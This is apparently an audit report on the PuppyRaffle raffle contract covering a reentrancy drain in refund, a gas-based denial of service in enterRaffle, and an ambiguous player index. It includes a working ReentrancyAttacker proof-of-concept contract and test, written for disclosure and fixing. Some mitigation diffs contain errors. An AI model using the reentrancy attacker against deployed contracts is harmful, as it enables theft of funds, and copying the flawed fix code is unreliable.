### [H-1] Executing a reentrancy attack from an external contract allows to drain all the ether deposited in the raffle.

IMPACT: HIGH
LIKELIHOOD: HIGH

**Description:** The function `PupplyRaffle::refund` can be attacked using reentrancy.

**Impact:** All contract funds can be drained ejecuting reentrancy in the `PupplyRaffle::refund` function.

**Proof of Concept:** 

If 100 users enters de raffle, and a malicious contract enters after and requests the refund executing reentrancy, all the funds will be drained.

- PuppyRaffle balance before attack: 100
- ReentrancyAttacker balance before attack: 1
  
- PuppyRaffle balance after attack: 0
- ReentrancyAttacker balance after attack: 101

<details>
<summary>PoC</summary>
Place the following test and contract at `PuppyRaffleTest.t.sol`

```javascript
    function test_reentracyRefund() public {
        ReentrancyAttacker reentrancyAttackerContract;
        reentrancyAttackerContract = new ReentrancyAttacker(puppyRaffle);
        vm.deal(address(reentrancyAttackerContract), 1 ether);

        // Let´s enter 100 players
        uint256 playersNumber = 100;
        address[] memory players = new address[](playersNumber);
        for (uint256 i = 0; i < playersNumber; i++) {
            players[i] = address(i);
        }
        
        // Enter 100 players to the raffle
        puppyRaffle.enterRaffle{value: entranceFee * playersNumber}(players);

        // Check balance before the attack
        console.log("PuppyRaffle balance before attack:", address(puppyRaffle).balance / 1e18);
        console.log("ReentrancyAttacker balance before attack:", address(reentrancyAttackerContract).balance / 1e18);
        console.log("-------------------");

        // Reentrancy attack contract starts the attack
        reentrancyAttackerContract.attack();

        // Check balance after attack
        console.log("PuppyRaffle balance after attack:", address(puppyRaffle).balance / 1e18);
        console.log("ReentrancyAttacker balance after attack:", address(reentrancyAttackerContract).balance / 1e18);
        console.log("-------------------");

        // Check the reentrancy attack count
        console.log("Reentrancy attack count:", reentrancyAttackerContract.attackCount());

        assertEq(address(puppyRaffle).balance, 0);
        assertEq(address(reentrancyAttackerContract).balance, 101 ether);
        assertEq(reentrancyAttackerContract.attackCount(), 101);
    }

    contract ReentrancyAttacker {
        PuppyRaffle puppyRaffleContract;
        uint256 public entraceFee;
        uint256 public playerIndex;
        
        uint256 public attackCount;

        constructor(PuppyRaffle _puppyRaffleContract) {
            puppyRaffleContract = _puppyRaffleContract;
            entraceFee = puppyRaffleContract.entranceFee();
        }

        function attack() public {
            // Enter the raffle
            address[] memory players = new address[](1);
            players[0] = address(this);
            puppyRaffleContract.enterRaffle{value: entraceFee}(players);
            // Refund the entrance fee & start attack
            playerIndex = puppyRaffleContract.getActivePlayerIndex(address(this));
            puppyRaffleContract.refund(playerIndex);
        }

        function _stealMoney() internal {
            attackCount++;
            if (address(puppyRaffleContract).balance >= entraceFee) {
                puppyRaffleContract.refund(playerIndex);
            }
        }

        receive() external payable {
            _stealMoney();
        }

        fallback() external payable {
            _stealMoney();
        }
    }
```
</details>

**Recommended Mitigation:** There are several ways to fix the reentrancy.

- Using CEI (Check - Effect - Interaction) Pattern.
```diff
    function refund(uint256 playerIndex) public {
+       // Check
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+       // Effect
-       payable(msg.sender).sendValue(entranceFee);
+       players[playerIndex] = address(0);

+       // Interaction
-       players[playerIndex] = address(0);
+       payable(msg.sender).sendValue(entranceFee);
        
        emit RaffleRefunded(playerAddress);
    }
```

- Using lock boolean as execution function condition.
```diff
+   boolean locked;
    function refund(uint256 playerIndex) public {
+       require(!locked, "Reentrancy is locked");
+       locked = true;
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        
        emit RaffleRefunded(playerAddress);
+       locked = false;
    }
```

- Using Openzeppelin ReentrancyGuard Contract (https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard)
  

### [M-1] Looping through player array to check for duplicates in the  `PupplyRaffle::enterRaffle` is a potencial denial of servide (DoS) attack, incrementing gas cost for future entrants.

IMPACT: MEDIUM
LIKELIHOOD: MEDIUM

**Description:** The `PupplyRaffle::enterRaffle` funciton loops through the `PupplyRaffle::players` array to check for duplicates. However, the longer the `PupplyRaffle::players` is the more check a new player will have to make. This means that the gas cost for players who entry early will be dramatically lower than those who enter late. Every aditional player entry in the array increase the gas cost of the transaction.

**Impact:** The gas cost for raffle entrants will greatly increase as more players enter the raffle. Discouragin later users from entering, and causing a rush at the start of the raffle to be one of the first entrants in the queue.

An attacker might make the `PupplyRaffle::players` array so big, that no one else enters, guarenteeing themselves the win.

**Proof of Concept:**

If we have 2 sets of 100 players enter, the gas cost will be such:

- 1st 100 players: ~6503265 gas.
- 2nd 100 players: ~18995512 gas.

This is more than 3x time expensive for the second 100 players set.

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffleTest.t.sol`.

```javascript
    function test_dnialOfService() public {
        // Let´s enter 100 players
        uint256 playersNumber = 100;
        address[] memory players = new address[](playersNumber);
        for (uint256 i = 0; i < playersNumber; i++) {
            players[i] = address(i);
        }
        
        // Set a non-zero gas price for this test
        uint256 customGasPrice = 1 gwei;
        vm.txGasPrice(customGasPrice);
        
        // see how much gas it takes to enter 100 players
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNumber}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsed = gasStart - gasEnd;
        uint256 gasCost = gasUsed * tx.gasprice;
        
        console.log("Gas cost for 100 players:", gasCost / 1e9);

        // Now for the second 100 players
        address[] memory playersTwo = new address[](playersNumber);
        for (uint256 i = 0; i < playersNumber; i++) {
            playersTwo[i] = address(i + playersNumber);
        }
        
        // see how much gas it takes to enter 100 players
        uint256 gasStartTwo = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNumber}(playersTwo);
        uint256 gasEndTwo = gasleft();
        uint256 gasUsedTwo = gasStartTwo - gasEndTwo;
        uint256 gasCostTwo = gasUsedTwo * tx.gasprice;
        
        console.log("Gas used for sencond 100 players:", gasCostTwo / 1e9);
    }
```
</details>
  
**Recommended Mitigation:** There are few recommendations.

1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.
2. Consider using a mapping to check for duplicates. This would allow constant time lookup of whether a user has already entered.

```diff
+   uint256 public raffleId;
+   mapping(address => uint256) public addressToRaffleId;

    constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
        entranceFee = _entranceFee;
        feeAddress = _feeAddress;
        raffleDuration = _raffleDuration;
        raffleStartTime = block.timestamp;

        rarityToUri[COMMON_RARITY] = commonImageUri;
        rarityToUri[RARE_RARITY] = rareImageUri;
        rarityToUri[LEGENDARY_RARITY] = legendaryImageUri;

        rarityToName[COMMON_RARITY] = COMMON;
        rarityToName[RARE_RARITY] = RARE;
        rarityToName[LEGENDARY_RARITY] = LEGENDARY;

+       raffleId = 1;
    }

    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
-       for (uint256 i = 0; i < newPlayers.length; i++) {
-           players.push(newPlayers[i]);
-       }
        for (uint256 i = 0; i < players.length - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
-               require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-           }
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+          players.push(newPlayers[i]);
        }
    }

    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
        totalFees = totalFees + uint64(fee);

        uint256 tokenId = totalSupply();

        // We use a different RNG calculate from the winnerIndex to determine rarity
        uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
        if (rarity <= COMMON_RARITY) {
            tokenIdToRarity[tokenId] = COMMON_RARITY;
        } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
            tokenIdToRarity[tokenId] = RARE_RARITY;
        } else {
            tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
        }

        delete players;
        raffleStartTime = block.timestamp;
        previousWinner = winner;
        (bool success,) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
+      raffleId++;
    }
```

### [L-1] Request getActivePlayerIndex through `PuppyRaffle::getActivePlayerIndex()` returns 0 both when the user is not in the array and when the user is the first player that entered on the raffle. The player might think they are not active.

**Description:** If the first player request their player index, they will get 0, on the same way that if they are not participating.

**Impact:** The player might think they are not participating in the raffle.

**Proof of Concept:**

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffleTest.t.sol`.

```javascript
    function test_getFirstActivePlayerIndex() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        uint256 firstActivePlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        uint256 noActivePlayer = puppyRaffle.getActivePlayerIndex(playerTwo);
        // Player one is the first active player
        assertEq(puppyRaffle.players(0), playerOne);
        // The returned index for active player1 is 0
        assertEq(firstActivePlayer, 0);
        // The returned index for non-active player2 is 0
        assertEq(noActivePlayer, 0);
    }
```
</details>

**Recommended Mitigation:**

- Return a pair of values (uint256 index, bool found)

```diff
-   function getActivePlayerIndex(address player) external view returns (uint256) {
+   function getActivePlayerIndex(address player) external view returns (uint256, bool) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
-               return i;
+               return (i, true);
            }
        }
-       return 0;
+       return (0, false);
    }
```